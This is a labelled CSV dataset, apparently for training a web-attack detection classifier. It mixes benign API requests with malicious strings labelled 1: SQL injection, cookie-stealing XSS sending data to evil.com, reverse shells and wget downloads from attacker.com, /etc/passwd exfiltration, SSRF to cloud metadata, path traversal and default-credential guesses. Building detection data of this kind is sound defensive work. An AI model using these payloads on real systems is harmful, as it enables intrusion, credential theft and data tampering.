"text","label"
"user_id=140&action=view","0"
"Authorization: Bearer validtoken282","0"
"user=1' OR '1'='1' /*","1"
"exec=; python -c 'import socket,subprocess'","1"
"POST /api/login body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /.git/config HTTP/1.1","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"url=dict://127.0.0.1:11211/","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/users?q=smartphone&brand=samsung","0"
"id=' OR 1=1 LIMIT 1--","1"
"GET /api/search?q=<details open ontoggle=alert(1)>","1"
"1' OR '1'='1' /*","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"POST /api/users body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"order_id=ORD-3019 status=confirmed","0"
"user_id=807&action=view","0"
"page=19&limit=20","0"
"POST /api/users body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"order_id=ORD-2279 status=confirmed","0"
"POST /api/login username=' OR 1=1# password=test","1"
"order_id=ORD-4096 status=confirmed","0"
"category=electronics&page=1","0"
"GET /profile/5536","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /settings body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"PUT /api/data?user=ahmed&filter=active","0"
"cmd=|| nc -e /bin/sh attacker.com 4444","1"
"username=administrator&password=superman","1"
"comment=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"Authorization: Bearer validtoken107","0"
"name=Ahmed email=68@mail.com","0"
"id=' OR '1'='1","1"
"user=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"Authorization: Bearer validtoken800","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"<script>alert(document.cookie)</script>","1"
"order_id=ORD-9130 status=confirmed","0"
"user_id=722&action=view","0"
"Authorization: Bearer validtoken809","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"1' oR '1'='1","1"
"User-Agent: masscan/1.3","1"
"user_id=731&action=view","0"
"url=file:///etc/passwd","1"
"order_id=ORD-4203 status=confirmed","0"
"POST /api/search body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /health HTTP/1.1","0"
"; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"url=gopher://127.0.0.1:25/","1"
"page=16&limit=50","0"
"GET /health HTTP/1.1","0"
"| uname -a","1"
"username='; WAITFOR DELAY '0:0:5'--","1"
"Authorization: Bearer validtoken519","0"
"search=headphones","0"
"GET /api/users/3942","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://localhost:8080","1"
"GET /api/data/2802","0"
"category=laptops page=1","0"
"page=27&limit=20","0"
"category=phones page=4","0"
"username=admin&password=letmein","1"
"POST /api/orders?user=ahmed&filter=active","0"
"name=Lina email=555@mail.com","0"
"name=Nour email=58@mail.com","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"User-Agent: masscan/1.3","1"
"POST /api/data body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"username=administrator&password=superman","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"exec=; python -c 'import socket,subprocess'","1"
"username=1' OR 0x31=0x31--","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"title=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"POST /api/feedback body=<script>alert(document.cookie)</script>","1"
"DELETE /api/login?user=ahmed&filter=active","0"
"search=tablet","0"
"order_id=ORD-9014 status=confirmed","0"
"ping=; ping -c 4 attacker.com","1"
"GET /health HTTP/1.1","0"
"repeated authentication failure admin account locked","1"
"GET /api/files?name=../../.git/config","1"
"order_id=ORD-1558 status=confirmed","0"
"GET /api/users?id=' OR '1'='1","1"
"name=Lina email=214@mail.com","0"
"User-Agent: Nmap Scripting Engine","1"
"url=gopher://127.0.0.1:25/","1"
"POST /api/login username=' UNION SELECT NULL-- password=test","1"
"search=<body onload=alert(1)>","1"
"name=Lina email=655@mail.com","0"
"path=file:///etc/passwd","1"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"GET /server-status HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Lina email=954@mail.com","0"
"GET /health HTTP/1.1","0"
"title=<iframe src=javascript:alert(1)>","1"
"DELETE /dashboard User-Agent: PostmanRuntime/7.36.0","0"
"Authorization: Bearer validtoken580","0"
"name=Omar email=20@mail.com","0"
"POST /api/data?limit=20&offset=0","0"
"filename=; cat /etc/shadow","1"
"GET /console HTTP/1.1","1"
"GET /api/data/2253","0"
"GET /admin HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"../../../../etc/shadow","1"
"name=Ahmed email=776@mail.com","0"
"GET /.git/config HTTP/1.1","1"
"GET /.env HTTP/1.1","1"
"order_id=ORD-6586 status=confirmed","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=938&action=view","0"
"GET /api/users?q=smartphone&brand=samsung","0"
"multiple failed login attempts detected for admin","1"
"comment=javascript:alert(document.cookie)","1"
"search=1' oR '1'='1","1"
"name=Nour email=39@mail.com","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=http://localhost:8080","1"
"order_id=ORD-4522 status=confirmed","0"
"search=laptop","0"
"GET /api/search/304","0"
"category=laptops page=9","0"
"name=Lina email=751@mail.com","0"
"order_id=ORD-5748 status=confirmed","0"
"ping=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"POST /settings body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"page=20&limit=20","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"category=phones page=10","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=185&action=view","0"
"login attempt failed username admin invalid credentials","1"
"POST /api/orders body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"status=pending&priority=high","0"
"category=audio page=7","0"
"DELETE /api/login?status=pending&priority=high","0"
"GET /api/search?q=javascript:alert(document.cookie)","1"
"name=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"GET /actuator/env HTTP/1.1","1"
"username=administrator&password=admin123","1"
"user=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"password spray attack detected multiple users","1"
"POST /api/login username=1 AND SLEEP(5)-- password=test","1"
"GET /backup.sql HTTP/1.1","1"
"GET /api/users/3860","0"
"message=<textarea onfocus=alert(1) autofocus>","1"
"name=<svg/onload=alert(1)>","1"
"GET /health HTTP/1.1","0"
"GET /api/swagger.json HTTP/1.1","1"
"search=headphones","0"
"GET /health HTTP/1.1","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"description=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"category=tablets page=6","0"
"name=Omar email=7@mail.com","0"
"PUT /api/users?limit=20&offset=0","0"
"PUT /dashboard?date=2024-01-15&type=order","0"
"user=1' AND SLEEP(5)--","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"page=29&limit=20","0"
"search=phone","0"
"POST /api/data body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=file:///etc/passwd","1"
"include=/etc/passwd%00","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"name=Nour email=4@mail.com","0"
"search=tablet","0"
"PUT /dashboard?search=laptop&sort=price","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"Authorization: Bearer validtoken622","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Authorization: Bearer validtoken160","0"
"POST /api/data body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"User-Agent: masscan/1.3","1"
"username=administrator&password=abc123","1"
"category=laptops page=6","0"
"page=27&limit=20","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"Authorization: Bearer validtoken156","0"
"category=audio page=9","0"
"name=Sara email=695@mail.com","0"
"GET /health HTTP/1.1","0"
"user_id=401&action=view","0"
"category=electronics&page=1","0"
"username=user&password=password","1"
"POST /profile User-Agent: python-requests/2.31.0","0"
"category=laptops page=2","0"
"url=http://127.0.0.1/admin","1"
"category=phones page=1","0"
"POST /api/orders?date=2024-01-15&type=order","0"
"page=10&limit=10","0"
"GET /health HTTP/1.1","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=311&action=view","0"
"path=file:///etc/passwd","1"
"order_id=ORD-2660 status=confirmed","0"
"search=laptop&sort=price","0"
"page=3&limit=50","0"
"url=dict://127.0.0.1:11211/","1"
"DELETE /api/search User-Agent: PostmanRuntime/7.36.0","0"
"GET /actuator/env HTTP/1.1","1"
"category=laptops page=7","0"
"GET /robots.txt scan probe reconnaissance","1"
"DELETE /api/search?status=pending&priority=high","0"
"POST /api/users body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"id=123&format=json","0"
"GET /api/files?name=../../../../var/log/apache2/access.log","1"
"GET /actuator/env HTTP/1.1","1"
"password spray attack detected multiple users","1"
"category=laptops page=4","0"
"GET /dashboard?date=2024-01-15&type=order","0"
"POST /api/feedback body=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"username=admin&password=admin","1"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"POST /api/feedback body=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"name=Sara email=319@mail.com","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/data?category=electronics&page=1","0"
"';alert(String.fromCharCode(88,83,83))//","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET ....//....//etc/passwd","1"
"POST /api/orders body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"POST /api/users body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"| wget http://attacker.com/shell.sh","1"
"GET /settings?category=electronics&page=1","0"
"POST /api/login username=' OR '1'='1 password=test","1"
"cmd=`id`","1"
"GET /health HTTP/1.1","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"title=<img src=`javascript:alert(1)`>","1"
"search=laptop&sort=price","0"
"category=laptops page=6","0"
"fetch=http://internal-service:8080/secret","1"
"search=headphones","0"
"url=http://metadata.google.internal","1"
"user_id=711&action=view","0"
"Authorization: Bearer validtoken187","0"
"PUT /dashboard User-Agent: axios/1.6.0","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"order_id=ORD-4672 status=confirmed","0"
"multiple failed login attempts detected for admin","1"
"Authorization: Bearer validtoken845","0"
"category=tablets page=1","0"
"url=gopher://127.0.0.1:25/","1"
"POST /api/orders?search=laptop&sort=price","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"POST /api/data body=command& whoami","1"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"path=../../.git/config","1"
"description=<textarea onfocus=alert(1) autofocus>","1"
"name=';alert(String.fromCharCode(88,83,83))//","1"
"GET /settings?date=2024-01-15&type=order","0"
"q=smartphone&brand=samsung","0"
"GET /api/login?date=2024-01-15&type=order","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/feedback body=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"order_id=ORD-6238 status=confirmed","0"
"POST /api/orders body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"Authorization: Bearer validtoken243","0"
"page=16&limit=20","0"
"page=19&limit=10","0"
"message=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"category=tablets page=10","0"
"'; WAITFOR DELAY '0:0:5'--","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"DELETE /api/users User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"search=phone","0"
"name=Omar email=528@mail.com","0"
"user_id=971&action=view","0"
"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"Authorization: Bearer validtoken619","0"
"host=| cat /etc/passwd","1"
"category=audio page=6","0"
"GET /api/search?q=<iframe src=javascript:alert(1)>","1"
"host=& ipconfig","1"
"url=file:///etc/passwd","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /settings/4947","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/users?id=' UNION SELECT NULL,NULL--","1"
"order_id=ORD-5557 status=confirmed","0"
"username=root&password=123456","1"
"GET /backup.sql HTTP/1.1","1"
"id=1 OR 1=1","1"
"GET /api/search/6074","0"
"search=<img src=`javascript:alert(1)`>","1"
"GET /api/users/6705","0"
"1' AND SLEEP(5)--","1"
"description=<div onmouseover=alert(1)>hover</div>","1"
"id=1'	OR	1=1--","1"
"order_id=ORD-8685 status=confirmed","0"
"search=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"GET /api/data?status=pending&priority=high","0"
"page=41&limit=50","0"
"url=http://metadata.google.internal","1"
"title=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"GET /health HTTP/1.1","0"
"name=Ahmed email=525@mail.com","0"
"name=Omar email=926@mail.com","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"' OR '1'='1'--","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=' OR 1=1#","1"
"GET /api/products/2943","0"
"search=tablet","0"
"id=123&format=json","0"
"GET /web.config HTTP/1.1","1"
"category=audio page=9","0"
"Authorization: Bearer validtoken771","0"
"page=28&limit=50","0"
"POST /api/products body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/login/4794","0"
"url=http://metadata.google.internal","1"
"user=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"GET /health HTTP/1.1","0"
"ping=& whoami","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Nour email=668@mail.com","0"
"name=Nour email=127@mail.com","0"
"url=http://metadata.google.internal","1"
"name=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"search=headphones","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"name=Sara email=865@mail.com","0"
"search=phone","0"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"order_id='; UPDATE users SET password='hacked' WHERE 1=1--","1"
"POST /api/products body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/swagger.json HTTP/1.1","1"
"GET /server-status HTTP/1.1","1"
"path=file:///etc/passwd","1"
"id=1 OR 1=1","1"
"exec=& whoami","1"
"GET /api/files?name=/etc/passwd%00","1"
"id=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"Authorization: Bearer validtoken690","0"
"url=dict://127.0.0.1:11211/","1"
"user_id=603&action=view","0"
"GET /health HTTP/1.1","0"
"search=headphones","0"
"Authorization: Bearer validtoken223","0"
"name=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"user_id=345&action=view","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"search=1'%09OR%091=1--","1"
"ping=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"Authorization: Bearer validtoken179","0"
"GET /health HTTP/1.1","0"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"username=administrator&password=abc123","1"
"POST /api/login username=') OR ('1'='1 password=test","1"
"User-Agent: Nmap Scripting Engine","1"
"include=/etc/passwd%00","1"
"GET /api/users/7770","0"
"GET /api/swagger.json HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"search=phone","0"
"Authorization: Bearer validtoken966","0"
"path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"Authorization: Bearer validtoken119","0"
"DELETE /api/login User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /settings/7754","0"
"POST /api/users body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"search=tablet","0"
"filename=| uname -a","1"
"Authorization: Bearer validtoken497","0"
"PUT /settings User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"category=audio page=9","0"
"url=http://127.0.0.1/admin","1"
"name=Lina email=37@mail.com","0"
"order_id=ORD-2701 status=confirmed","0"
"GET /dashboard User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"user=ahmed&filter=active","0"
"category=tablets page=7","0"
"GET /api/search/545","0"
"multiple failed login attempts detected for admin","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/search/7932","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET file:///etc/passwd","1"
"path=file:///etc/passwd","1"
"Authorization: Bearer validtoken981","0"
"POST /settings User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"search=headphones","0"
"name=<script>alert(document.cookie)</script>","1"
"Authorization: Bearer validtoken672","0"
"GET /.git/config HTTP/1.1","1"
"username=root&password=123456","1"
"id=' OR ''='","1"
"GET /backup.sql HTTP/1.1","1"
"PUT /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"user_id=545&action=view","0"
"PUT /settings User-Agent: python-requests/2.31.0","0"
"POST /api/orders body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /health HTTP/1.1","0"
"POST /api/users body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"category=tablets page=10","0"
"GET /api/search?q=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"name=Ahmed email=235@mail.com","0"
"search=tablet","0"
"POST /api/feedback body=<a href='javascript:alert(1)'>click</a>","1"
"GET /phpmyadmin HTTP/1.1","1"
"include=../../../../etc/passwd","1"
"url=http://192.168.1.1","1"
"GET /settings?q=smartphone&brand=samsung","0"
"PUT /api/products?user=ahmed&filter=active","0"
"category=audio page=4","0"
"name=Ahmed email=271@mail.com","0"
"search=phone","0"
"user_id=888&action=view","0"
"page=32&limit=10","0"
"category=tablets page=3","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"filename=; ls -la","1"
"GET /api/search/3825","0"
"page=37&limit=50","0"
"username=root&password=admin123","1"
"Authorization: Bearer validtoken988","0"
"name=Sara email=589@mail.com","0"
"page=13&limit=20","0"
"multiple failed login attempts detected for admin","1"
"GET /server-status HTTP/1.1","1"
"comment=<img src='x' onerror='alert(1)'>","1"
"brute force attempt on login endpoint from single ip","1"
"GET /health HTTP/1.1","0"
